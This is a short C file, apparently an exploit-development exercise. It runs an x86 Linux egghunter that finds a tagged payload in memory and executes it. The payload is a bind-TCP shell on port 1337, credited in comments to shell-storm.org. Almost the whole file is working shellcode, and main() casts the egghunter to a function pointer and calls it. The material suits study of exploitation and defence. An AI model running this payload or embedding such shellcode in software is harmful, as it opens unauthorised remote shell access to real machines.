#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \

"\x31\xdb\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x30\x30\x6c\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
"\x74\x30\x30\x6c\x74\x30\x30\x6c"    /**Egg is l00tl00t**/

//**  For quick demo of egghunter , collect shellcode from http://shell-storm.org **//
//** http://shell-storm.org/shellcode/files/shellcode-882.php **/
//** shell-storm shellcode length 89 bytes **//
//** Title  : Shell Bind TCP Shellcode Port 1337 - 89 bytes **//
//** Platform: Linux/x86  **//
//** Date:     2014-07-13 **//
//** Author:   Julien Ahrens (@MrTuxracer) **//
//** Website:  http://www.rcesecurity.com  **//

"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";

int main()
{

	printf("Egg Hunter Shellcode Length:  %d\n", strlen(egghunter));
        printf("Final payload Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())egghunter;

	ret();

}

